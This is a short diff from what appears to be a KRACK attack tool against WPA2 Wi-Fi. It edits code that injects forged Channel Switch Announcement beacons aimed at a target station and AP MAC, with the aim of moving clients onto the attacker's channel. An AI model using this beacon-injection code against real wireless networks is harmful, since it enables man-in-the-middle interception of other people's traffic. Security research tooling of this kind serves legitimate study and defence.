@@ -257,11 +257,11 @@ class KRAckAttack():
 			# Note: Intel firmware requires first receiving a CSA beacon with a count of 2 or higher,
 			# followed by one with a value of 1. When starting with 1 it errors out.
 			# csabeacon = append_csa(beacon, newchannel, 2)
-			csabeacon = construct_csa(newchannel, 2)
+			csabeacon = construct_csa(newchannel, self.apmac, 2, target)
 			self.sock_real.send(csabeacon, True, self.netconfig.real_channel)
 
 			# csabeacon = append_csa(beacon, newchannel, 1)
-			csabeacon = construct_csa(newchannel, 1)
+			csabeacon = construct_csa(newchannel, self.apmac, 1, target)
 			self.sock_real.send(csabeacon, True, self.netconfig.real_channel)
 
 		if not silent: log(STATUS, "Injected %d CSA beacon pairs (moving stations to channel %d)" % (numbeacons, newchannel), color="green")
